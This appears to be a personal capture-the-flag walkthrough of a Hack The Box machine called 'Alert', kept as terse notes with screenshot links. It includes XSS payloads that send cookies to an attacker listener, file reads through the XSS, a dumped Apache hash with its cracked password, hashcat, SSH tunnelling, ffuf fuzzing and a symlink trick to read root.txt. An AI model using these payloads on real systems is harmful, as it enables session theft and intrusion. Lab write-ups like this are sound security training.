![image 90.png](assets/Alert/image%2090.png)
![image 1 57.png](assets/Alert/image%201%2057.png)
  
![image 2 57.png](assets/Alert/image%202%2057.png)
  
can upload a markdown file with xss
![image 3 50.png](assets/Alert/image%203%2050.png)
![image 4 46.png](assets/Alert/image%204%2046.png)
  
  
it’s reflected xss, so we need an “admin” to click our link
- example of us stealing our own homemade cookie (shows it’s reflected)
![image 5 45.png](assets/Alert/image%205%2045.png)
![image 6 41.png](assets/Alert/image%206%2041.png)
- <SCRIPT>document.location='[http://10.10.14.6:7777/?'+document.cookie](http://10.10.14.6:7777/?%27+document.cookie)</SCRIPT>
  
```Python
<script>
fetch('http://10.10.14.6:7777/', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
choosing share markdown, then copying the URL and putting it into the contact us page has an “admin” that will click it and send information to the listener
![image 7 40.png](assets/Alert/image%207%2040.png)
- bottom right of page when uploading markdown
![image 8 37.png](assets/Alert/image%208%2037.png)
  
![image 9 37.png](assets/Alert/image%209%2037.png)
- uploading this to admin gets this
![image 10 32.png](assets/Alert/image%2010%2032.png)
  
now that we actually get a message back, we can change it to get the file contents of any file we want
![image 11 31.png](assets/Alert/image%2011%2031.png)
![image 12 24.png](assets/Alert/image%2012%2024.png)
![image 13 24.png](assets/Alert/image%2013%2024.png)
  
in /etc/apache2/apache2.conf
![image 14 22.png](assets/Alert/image%2014%2022.png)
- /etc/apache2/envvars
  
![image 15 20.png](assets/Alert/image%2015%2020.png)
![image 16 18.png](assets/Alert/image%2016%2018.png)
- albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
  
- hashcat -m 1600 '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' /usr/share/wordlists/rockyou.txt --show
    
    - 1600 is an apache hash
    
- albert:manchesterunited
![image 17 16.png](assets/Alert/image%2017%2016.png)
  
![image 18 15.png](assets/Alert/image%2018%2015.png)
![image 19 14.png](assets/Alert/image%2019%2014.png)
![image 20 11.png](assets/Alert/image%2020%2011.png)
- ssh -L 1234:localhost:8080 albert@10.10.11.44
  
![image 21 11.png](assets/Alert/image%2021%2011.png)
  
- ffuf -u [http://localhost:1234/FUZZ](http://localhost:1234/FUZZ) -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fw 2070
![image 22 10.png](assets/Alert/image%2022%2010.png)
  
- ffuf -u [http://statistics.alert.htb/FUZZ](http://statistics.alert.htb/FUZZ) -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fw 42
  
![image 23 9.png](assets/Alert/image%2023%209.png)
- going to statistics.alert.htb and signing in with albert’s creds
    
    - don’t think this is relevant
    
  
![image 24 8.png](assets/Alert/image%2024%208.png)
- check the github
![image 25 5.png](assets/Alert/image%2025%205.png)
![image 26 3.png](assets/Alert/image%2026%203.png)
  
![image 27 3.png](assets/Alert/image%2027%203.png)
- monitors has full access on the folder
  
![image 28 3.png](assets/Alert/image%2028%203.png)
- link root.txt to test.txt
  
![image 29 3.png](assets/Alert/image%2029%203.png)
- on the github there is a monitors directory
  
go to /monitors/test.txt to read the contents of the linked file
![image 30 3.png](assets/Alert/image%2030%203.png)